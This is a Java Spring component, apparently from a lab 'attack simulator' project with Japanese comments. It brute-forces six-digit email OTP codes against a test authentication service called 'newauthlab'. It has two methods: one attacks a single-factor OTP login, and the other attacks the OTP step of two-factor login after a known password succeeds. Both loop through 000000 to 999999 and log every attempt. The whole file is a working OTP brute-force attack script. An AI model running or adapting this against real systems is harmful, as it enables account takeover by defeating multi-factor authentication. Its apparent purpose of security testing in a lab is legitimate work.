package com.example.attacksimulator.attack;

import org.springframework.stereotype.Component;

import com.example.attacksimulator.client.NewAuthLabLoginClient;
import com.example.attacksimulator.client.NewAuthLabLoginClient.LoginResult;

@Component
public class EmailOtpBruteForceAttack {

	private final NewAuthLabLoginClient newAuthLabLoginClient;

	public EmailOtpBruteForceAttack(
			NewAuthLabLoginClient newAuthLabLoginClient) {

		this.newAuthLabLoginClient =
				newAuthLabLoginClient;
	}

	// =========================================================
	// 一要素認証
	// Email OTP 総当たり攻撃
	// =========================================================

	/**
	 * Email OTP 総当たり攻撃
	 *
	 * @param username 対象ユーザーのユーザー名
	 * @param email 対象ユーザーのメールアドレス
	 * @param maxAttempts 最大攻撃試行回数
	 * @return 攻撃結果
	 */
	public AttackResult execute(
			String username,
			String email,
			int maxAttempts) {

		if (username == null
				|| username.isBlank()) {

			throw new IllegalArgumentException(
					"ユーザー名が指定されていません。");
		}

		if (email == null
				|| email.isBlank()) {

			throw new IllegalArgumentException(
					"メールアドレスが指定されていません。");
		}

		if (maxAttempts <= 0) {

			throw new IllegalArgumentException(
					"最大試行回数は1以上にしてください。");
		}

		// OTPは000000～999999の6桁
		int actualMaxAttempts =
				Math.min(
						maxAttempts,
						1_000_000);

		System.out.println(
				"========================================");

		System.out.println(
				"Email OTP総当たり攻撃開始");

		System.out.println(
				"username = "
						+ username);

		System.out.println(
				"email = "
						+ email);

		System.out.println(
				"最大試行回数 = "
						+ actualMaxAttempts);

		System.out.println(
				"========================================");

		/*
		 * まず対象ユーザーのメールアドレスにOTPを発行する
		 */
		LoginResult sendOtpResult =
				newAuthLabLoginClient.sendEmailOtp(
						username,
						email);

		if (!sendOtpResult.isRequestSuccess()) {

			System.out.println(
					"OTP発行に失敗しました。");

			System.out.println(
					"HTTP Status = "
							+ sendOtpResult.getStatusCode());

			return new AttackResult(
					false,
					null,
					0,
					null);
		}

		System.out.println(
				"newauthlabからOTPが発行されました。");

		int attemptCount = 0;

		/*
		 * 000000 ～ 999999 を総当たり
		 */
		for (int i = 0;
				i < 1_000_000;
				i++) {

			if (attemptCount >= actualMaxAttempts) {
				break;
			}

			String candidate =
					String.format(
							"%06d",
							i);

			attemptCount++;

			// OTP候補を1件ずつ表示
			System.out.println(
					"Email OTP総当たり 試行 "
							+ attemptCount
							+ " / "
							+ actualMaxAttempts
							+ " : "
							+ candidate);

			LoginResult verifyResult =
					newAuthLabLoginClient
							.verifyEmailOtp(
									candidate);

			if (verifyResult.isSuccess()) {

				return new AttackResult(
						true,
						candidate,
						attemptCount,
						verifyResult);
			}
		}

		return new AttackResult(
				false,
				null,
				attemptCount,
				null);
	}

	// =========================================================
	// 二要素認証
	// Password → Email OTP 総当たり攻撃
	// =========================================================

	/**
	 * 二要素認証のEmail OTP総当たり攻撃
	 *
	 * Password認証がすでに成功した状態から、
	 * Email OTPを000000～999999まで総当たりする。
	 */
	public AttackResult executeTwoFactor(
			String username,
			String password,
			int maxAttempts) {

		if (username == null
				|| username.isBlank()) {

			throw new IllegalArgumentException(
					"ユーザー名が指定されていません。");
		}

		if (password == null
				|| password.isBlank()) {

			throw new IllegalArgumentException(
					"パスワードが指定されていません。");
		}

		if (maxAttempts <= 0) {

			throw new IllegalArgumentException(
					"最大試行回数は1以上にしてください。");
		}

		// OTPは000000～999999の6桁
		int actualMaxAttempts =
				Math.min(
						maxAttempts,
						1_000_000);

		System.out.println(
				"========================================");

		System.out.println(
				"二要素認証 Email OTP総当たり攻撃開始");

		System.out.println(
				"username = "
						+ username);

		System.out.println(
				"OTP最大試行回数 = "
						+ actualMaxAttempts);

		System.out.println(
				"========================================");

		// =====================================================
		// Password認証
		// =====================================================

		LoginResult passwordResult =
				newAuthLabLoginClient
						.loginTwoFactorPassword(
								username,
								password);

		if (!passwordResult.isRequestSuccess()) {

			System.out.println(
					"二要素認証のPassword認証に失敗しました。");

			System.out.println(
					"HTTP Status = "
							+ passwordResult.getStatusCode());

			return new AttackResult(
					false,
					null,
					0,
					passwordResult);
		}

		System.out.println(
				"Password認証成功。");

		System.out.println(
				"newauthlabから二要素認証用OTPが発行されました。");

		// =====================================================
		// OTP総当たり
		// =====================================================

		int attemptCount = 0;

		for (int i = 0;
				i < 1_000_000;
				i++) {

			if (attemptCount >= actualMaxAttempts) {
				break;
			}

			String candidate =
					String.format(
							"%06d",
							i);

			attemptCount++;

			// OTP候補を1件ずつ表示
			System.out.println(
					"二要素Email OTP総当たり 試行 "
							+ attemptCount
							+ " / "
							+ actualMaxAttempts
							+ " : "
							+ candidate);

			LoginResult verifyResult =
					newAuthLabLoginClient
							.verifyTwoFactorOtp(
									candidate);

			if (verifyResult.isSuccess()) {

				return new AttackResult(
						true,
						candidate,
						attemptCount,
						verifyResult);
			}
		}

		return new AttackResult(
				false,
				null,
				attemptCount,
				null);
	}

	// =========================================================
	// Email OTP総当たり攻撃結果
	// =========================================================

	public static class AttackResult {

		private final boolean success;

		private final String otp;

		private final int attemptCount;

		private final LoginResult loginResult;

		public AttackResult(
				boolean success,
				String otp,
				int attemptCount,
				LoginResult loginResult) {

			this.success = success;

			this.otp = otp;

			this.attemptCount =
					attemptCount;

			this.loginResult =
					loginResult;
		}

		/**
		 * 旧形式との互換用
		 */
		public AttackResult(
				boolean success,
				String otp,
				int attemptCount) {

			this(
					success,
					otp,
					attemptCount,
					null);
		}

		public boolean isSuccess() {
			return success;
		}

		public String getOtp() {
			return otp;
		}

		public int getAttemptCount() {
			return attemptCount;
		}

		public LoginResult getLoginResult() {
			return loginResult;
		}
	}
}